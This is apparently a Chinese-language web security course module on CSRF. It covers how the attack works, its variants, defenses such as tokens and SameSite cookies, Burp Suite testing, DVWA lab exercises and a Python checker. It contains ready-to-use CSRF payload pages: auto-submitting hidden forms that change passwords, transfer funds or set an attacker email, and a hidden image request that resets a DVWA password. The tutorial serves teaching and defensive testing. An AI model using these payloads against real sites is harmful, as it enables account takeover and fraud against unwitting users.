# 04 CSRF攻击 —— 借刀杀人的艺术

> CSRF不需要偷你的密码，不需要注入代码，
> 只需要让你的浏览器**在你不知情的情况下发一个请求**。
> 它利用的不是技术漏洞，而是浏览器的一个"特性"：**自动携带Cookie**。

---

## 一、CSRF的本质

### 1.1 一个生活中的类比

```
你去银行柜台办业务，银行通过你的身份证确认你的身份。

CSRF就像是：
  坏人写了一张"给坏人转账10万"的申请单
  趁你不注意塞到你手里
  你稀里糊涂递给了柜员
  柜员看了你的身份证——确实是你本人
  于是执行了转账

关键：柜员（服务器）只看身份（Cookie），不确认这个操作是不是你自愿发起的。
```

### 1.2 技术原理

```
前提条件：用户已经登录了target.com（浏览器中有session Cookie）

[正常操作]
用户在target.com上点击"修改密码"
浏览器发送：
  POST https://target.com/change-password
  Cookie: session=abc123        ← 浏览器自动携带
  Body: new_password=newpass123

[CSRF攻击]
1. 攻击者创建一个恶意页面 evil.com/attack.html：

<html>
<body>
  <h1>恭喜中奖！点击领取</h1>
  <!-- 隐藏的表单，页面加载时自动提交 -->
  <form action="https://target.com/change-password" method="POST" id="f">
    <input type="hidden" name="new_password" value="hacked123">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>

2. 攻击者诱骗用户访问 evil.com/attack.html
3. 用户的浏览器自动向target.com发送POST请求
4. 因为用户已登录，浏览器会自动携带target.com的Cookie
5. target.com收到请求，验证Cookie有效 → 密码被改了
6. 用户全程不知道发生了什么
```

### 1.3 CSRF的核心利用条件

```
必须同时满足三个条件：

[1] 用户已登录目标网站（浏览器中有有效的Cookie）
[2] 目标操作只靠Cookie验证身份（没有额外的Token验证）
[3] 攻击者能预测请求的所有参数（没有不可预测的值）

任何一个条件不满足，CSRF就失败。
安全防御也是从这三个条件入手。
```

---

## 二、CSRF攻击方式

### 2.1 GET请求的CSRF（最简单）

```
如果目标网站用GET请求执行敏感操作（错误做法）：
  GET https://target.com/transfer?to=attacker&amount=10000

攻击方式极其简单——一个图片标签就行：
  <img src="https://target.com/transfer?to=attacker&amount=10000">

  用户的浏览器会自动请求这个"图片"URL
  实际上是发了一个转账请求
  Cookie自动携带
  转账执行

甚至可以放在论坛签名、邮件中……用户只要看到这个页面就中招。
```

### 2.2 POST请求的CSRF

```html
<!-- 隐藏表单 + 自动提交 -->
<form action="https://target.com/api/transfer" method="POST" id="csrf_form">
  <input type="hidden" name="to_account" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf_form').submit();</script>
```

### 2.3 JSON请求的CSRF

```html
<!-- 如果接口接受JSON，用fetch发送 -->
<!-- 注意：如果目标有CORS限制，且Content-Type是application/json，
     浏览器会先发OPTIONS预检请求，可能被拦截 -->

<!-- 技巧：有些服务端同时接受form和json格式 -->
<form action="https://target.com/api/transfer" method="POST"
      enctype="text/plain">
  <input name='{"to":"attacker","amount":10000,"ignore":"' value='"}'>
</form>
<!-- 提交后body是：{"to":"attacker","amount":10000,"ignore":"="}
     如果服务端宽容地解析JSON，这就能绕过 -->
```

---

## 三、CSRF防御机制

### 3.1 CSRF Token（最主要的防御）

```
原理：在表单中加一个随机的、不可预测的Token

[服务端]
1. 用户请求页面时，生成一个随机Token
2. 把Token放在表单的hidden字段中
3. 同时把Token存在Session中

<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a7b3c9d2e1f0...">  ← 随机值
  <input name="to_account" value="">
  <input name="amount" value="">
  <button>转账</button>
</form>

[验证]
用户提交表单时，服务端比较：
  表单中的Token == Session中的Token？
  相同 → 执行操作
  不同/缺失 → 拒绝

[为什么能防CSRF]
攻击者无法知道Token的值（每次随机生成）
攻击者构造的恶意表单中没有正确的Token
所以服务端会拒绝请求
```

### 3.2 SameSite Cookie

```
Set-Cookie: session=abc123; SameSite=Strict

SameSite属性控制Cookie在跨站请求中是否携带：

SameSite=Strict
  任何跨站请求都不携带Cookie
  最安全，但体验差（从邮件点链接到target.com也不带Cookie）

SameSite=Lax（现代浏览器的默认值）
  跨站GET请求携带Cookie（如点击链接）
  跨站POST请求不携带Cookie
  兼顾安全和体验

SameSite=None
  所有请求都携带（必须配合Secure属性）
  等于没有防护
```

### 3.3 Referer/Origin检查

```
服务端检查请求的Referer或Origin头：
  Referer: https://target.com/transfer_page → 来自本站，允许
  Referer: https://evil.com/attack.html     → 来自外站，拒绝

缺点：
  - Referer可以被某些方式省略（<meta name="referrer" content="no-referrer">）
  - 有些用户/代理会禁用Referer
  - 可能被绕过（Referer包含目标域名就放行？子串匹配可能被利用）
```

### 3.4 双重提交Cookie

```
原理：在Cookie和请求参数中同时发送一个Token

1. 服务端在Cookie中设置随机Token：
   Set-Cookie: csrf=random123

2. 前端JavaScript读取Cookie，放到请求参数中：
   POST /transfer
   Cookie: csrf=random123
   Body: csrf_token=random123&to=...

3. 服务端比较Cookie中的值和参数中的值是否一致

为什么有效：
  攻击者可以让浏览器自动携带Cookie
  但攻击者无法读取Cookie的值（同源策略限制）
  所以攻击者无法在请求参数中放入正确的值
```

---

## 四、CSRF检测实战

### 4.1 检测步骤

```
第1步：识别敏感操作
  哪些操作需要CSRF防护？
  - 修改密码/邮箱/手机
  - 转账/支付
  - 修改个人信息
  - 创建/删除内容
  - 修改权限设置
  - 绑定/解绑第三方账号

第2步：检查是否有CSRF防护
  用Burp Suite拦截请求，观察：
  - 有没有csrf_token参数？
  - 有没有自定义请求头（如X-CSRF-Token）？
  - Cookie是否设了SameSite？

第3步：测试防护是否有效
  如果有Token：
  □ 删除Token参数 → 请求还能成功吗？（验证是否必须）
  □ 用空值Token → 请求还能成功吗？
  □ 用另一个用户的Token → 能不能通用？
  □ Token用过一次后还能再用吗？（是否一次性）
  □ 只修改Token的一部分 → 验证精度如何？

第4步：尝试构造攻击
  如果发现没有防护或防护可绕过：
  构造一个HTML页面，自动发送请求
  在另一个浏览器（已登录）中打开这个页面
  观察操作是否被执行
```

### 4.2 Burp Suite中测试CSRF

```
1. Burp Proxy拦截一个敏感操作的请求
2. 右键 → Engagement tools → Generate CSRF PoC
3. Burp会自动生成一个HTML页面
4. 把HTML保存为文件，在浏览器中打开
5. 观察操作是否被执行
```

---

## 五、CSRF vs XSS

```
这两个漏洞经常被混淆，但它们是完全不同的：

          XSS                         CSRF
目标      注入并执行JavaScript         让用户发送非自愿的请求
攻击载体  恶意脚本                     恶意请求
利用的是  服务器信任用户输入            服务器信任浏览器的Cookie
执行位置  受害者浏览器中执行代码        受害者浏览器发送请求
需要条件  输出点没有编码               操作没有CSRF防护
能做的事  几乎任何事（Cookie、DOM、请求）只能执行预设的操作
信任关系  服务端信任了恶意输入          服务端信任了Cookie身份

重要关系：XSS可以绕过CSRF防护！
  如果有XSS漏洞，攻击者可以用JavaScript读取CSRF Token
  然后带着Token发请求，完美绕过CSRF防护
  → 这就是为什么XSS被认为比CSRF更危险
```

---

## 六、动手实践

### 实践1：DVWA CSRF（Low级别）

```
1. DVWA → CSRF 页面（修改密码功能）
2. 正常修改密码，用Burp观察请求：
   GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
   注意：这是个GET请求的密码修改！没有CSRF Token！

3. 构造恶意页面：

<html>
<body>
<h1>免费领取iPhone！</h1>
<img src="http://localhost:8081/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
<p>恭喜！请等待处理...</p>
</body>
</html>

4. 保存为 csrf_attack.html
5. 确保你已经登录了DVWA
6. 在同一个浏览器打开 csrf_attack.html
7. 密码被改了！验证：用新密码 hacked 登录
```

### 实践2：构造POST请求的CSRF

```html
<!-- 保存为 csrf_post.html -->
<html>
<body>
<h1>正在加载...</h1>
<form id="csrf" method="POST" action="http://target.com/api/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
  document.getElementById('csrf').submit();
</script>
</body>
</html>
```

### 实践3：Python验证CSRF防护

```python
"""检测CSRF防护措施"""
import requests
from bs4 import BeautifulSoup

def check_csrf_protection(url, method="GET"):
    """检查一个表单/接口是否有CSRF防护"""
    session = requests.Session()

    # 先登录（以DVWA为例）
    session.post("http://localhost:8081/login.php", data={
        "username": "admin", "password": "password", "Login": "Login"
    })

    # 获取目标页面
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")

    print(f"检查: {url}\n")

    # 检查1：页面中是否有CSRF Token
    token_fields = soup.find_all("input", attrs={"name": lambda n: n and
        any(kw in n.lower() for kw in ["csrf", "token", "_token", "xsrf"])})

    if token_fields:
        for field in token_fields:
            print(f"  [发现] CSRF Token字段: name={field.get('name')}, value={field.get('value', '')[:20]}...")
    else:
        print("  [!] 未发现CSRF Token字段")

    # 检查2：响应头中的Cookie属性
    for cookie_header in resp.headers.get("Set-Cookie", "").split(","):
        if cookie_header.strip():
            has_samesite = "SameSite" in cookie_header
            print(f"  Cookie SameSite: {'设置了' if has_samesite else '未设置!'}")

    # 检查3：尝试不带Token发请求
    # （具体实现取决于目标接口的参数）

    return bool(token_fields)

# check_csrf_protection("http://localhost:8081/vulnerabilities/csrf/")
```

---

## 七、CSRF检查清单

```
对每个敏感操作（增/删/改/关键查询）：

防护机制检查：
  □ 请求中是否有CSRF Token？
  □ Token是否随机且不可预测？
  □ Token验证是否严格（删除/篡改Token后请求被拒绝）？
  □ Cookie是否设了SameSite=Lax或Strict？
  □ 是否检查了Referer/Origin？

绕过测试：
  □ 删除Token参数
  □ Token设为空
  □ 使用其他用户的Token
  □ 使用过期Token
  □ 修改请求方法（POST→GET）Token验证还在吗？
  □ 修改Content-Type，Token验证还在吗？

设计层面：
  □ 敏感操作是否使用POST/PUT/DELETE（不是GET）？
  □ 关键操作（改密码、转账）是否要求二次验证（输入旧密码/验证码）？
```

---

## 八、自测清单

- [ ] CSRF的本质是什么？利用了浏览器的什么特性？
- [ ] CSRF攻击需要满足哪三个条件？
- [ ] GET请求的CSRF和POST请求的CSRF构造方式有什么区别？
- [ ] CSRF Token为什么能防御CSRF？
- [ ] SameSite Cookie的Strict和Lax有什么区别？
- [ ] CSRF和XSS有什么区别和联系？为什么说XSS能绕过CSRF防护？
- [ ] 能在DVWA上完成CSRF攻击？
- [ ] 拿到一个接口，怎么检测它是否有CSRF防护？

---

> **下一模块：** [05 认证缺陷](../05-broken-auth/README.md) —— 登录/Session/Token的安全问题
